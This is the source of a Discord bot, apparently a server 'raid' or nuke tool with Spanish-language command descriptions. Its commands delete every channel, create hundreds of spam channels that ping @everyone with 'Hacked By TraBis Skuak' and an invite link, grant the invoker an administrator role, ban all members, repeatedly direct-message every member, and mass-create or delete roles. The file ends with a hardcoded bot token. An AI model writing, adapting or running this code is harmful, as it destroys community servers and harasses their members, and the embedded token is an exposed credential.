const express = require('express')
const app = express()

app.get('/', function (req, res) {
  res.send('TraBis')
})
let port = process.env.PORT || 3000;
app.listen(port)

require('dotenv').config()
/////////////////////////////////////////////////////////////
const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');
const botPrefix = ('.')

client.on("ready", () => {


console.log(chalk.green(`

                █     █░▓█████  ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀
                ▓█░ █ ░█░▓█   ▀ ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
                ▒█░ █ ░█ ▒███   ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
                ░█░ █ ░█ ▒▓█  ▄ ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
                ░░██▒██▓ ░▒████▒░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
                ░ ▓░▒ ▒  ░░ ▒░ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
                  ▒ ░ ░   ░ ░  ░ ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
                  ░   ░     ░    ░  ░░ ░  ░   ▒   ░        ░ ░░ ░ 
                    ░       ░  ░ ░  ░  ░      ░  ░░ ░      ░  ░   
                                                  ░               

`))


console.log(chalk.white(`
                 
                                          
                 .on | Jode el servidor de inmediato, ejecutando todos los comandos.
                 .nuke | Elimina todos los chats, dejando solo 1 para poner otros comandos.
                 .raid | Crea muchos canales con ping y mensajes.
                 .admin | Crea un rol con perms de administrador y te lo da.
                 .crearroles / . eliminarroles | Crea o elimina roles del servidor
                 .banall | Este comando banea a todos los usuarios del servidor (algunas veces falla)
                 .mdall | Envia multiples mensajes a todos los miembros del servidor
                 .lista | Obten informacion del raid (stats)


`))


   presencia();  
    });



function presencia(){
  client.user.setPresence({
status: "dnd",
activity: {
  name: "Usa !help para ver la lista de comandos",
  type: "PLAYING"

}
  });
}


client.on("message", message => {
  if(message.author.bot) return;

  if(message.content === '.on'){

    console.log(chalk.green(`                [+] Raid en ejecucion`))


      message.delete()
      message.guild.channels.cache.forEach(channel => channel.delete());
      message.guild.channels.create(`Raided-By-TraBis`, {
        type: 'text'
      }).then(channel => {
        channel.send("#TraBis $kuak")
      })
    for (let i = 0; i <= 500; i++) {
         message.guild.channels.create(`Raided-By-TraBis`, {
           type: 'text'
         }).then(channel => {
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
           
           
       })
       }
       message.guild.setName("#TraBis$kuak");
       message.guild.setIcon("https://cdn.discordapp.com/attachments/893528596084297728/893821644383060018/kcqwvti75ia51.png");
     }
})


//admin

client.on("message", async msg => {


  if (msg.author.bot) return;
  if(msg.content.toLowerCase().startsWith('.admin')){
    let rol = await msg.guild.roles.create({data: {
      name: "$",
      color: "B9BBBE",
      permissions: "ADMINISTRATOR",
      hoisted: false
    }})

msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => {});
      })
      .catch(e => {});
  }
});


//lista


client.on("message", message => {


    if (message.author.bot) return;
    const args = message.content.slice().trim().split(/ +/g );
    const command = args.shift().toLowerCase();
   if (command === '.lista') {
       message.delete()
       const embed = new Discord.MessageEmbed()
       .setTitle("Informacion de proceso del raid")
       .setThumbnail()
       .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
       .setColor("RED");
       message.channel.send(embed)
   }
});


//banall

client.on("message", async message => {
    if(message.content.startsWith('.banall')){
      message.delete();
      if(!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
      message.guild.members.cache.forEach(member => {
        if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
          member.ban();
        }
      })
    }});


//nuke 

client.on("message", message => {
    if (message.author.bot) return;
  
   if (message.content === '.nuke') {

    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`TraBis Ez Raid`, {
          type: 'text'
        }).then(channel => {
          channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif")
        })
         }
      })


//chats

client.on("message", message => {


            if (message.author.bot) return;
          
           if (message.content === '.raid') {
            message.delete()
           for (let i = 0; i <= 500; i++) {
                message.guild.channels.create(`Attacked by TraBis`, {
                  type: 'text'
                }).then(channel => {
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  channel.send("@everyone **Hacked By TraBis Skuak** https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif");
                  
              })
              }
              }
            });

//mdall

client.on("message", message => {
                        if (message.author.bot) return;
                        
                      if(message.content === ".mdall")
                        message.delete()
                      message.guild.members.cache.forEach(member => {
                        setInterval(function(){
                          member.send("El servidor en el que estabas fue raideado por TraBis Skuak - https://discord.gg/bmhUBq3382 , https://c.tenor.com/PXAduufsN0YAAAAC/travis-scott-fire.gif").catch(error => {});
                        },450);
                      })
                      });


//borrar roles

client.on("message", message => {


                    if (message.author.bot) return;
                  
                     if(message.content === ('.eliminarroles')){
                      message.delete()
                            message.guild.roles.cache.map(roles => roles.delete());
                          }
                  });

//crear roles

client.on("message", message => {

                if (message.author.bot) return;
              
               if (message.content === '.crearroles') {
                message.delete()
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `TraBis`,color: '#d41818',},reason: 'razon',})
              };
               }
                });




client.login("ODkxMjgzNDI0ODY0NzY4MDUw.YU8GXw.BIo_6sHOzwDmndYXudXAJPEnkrw");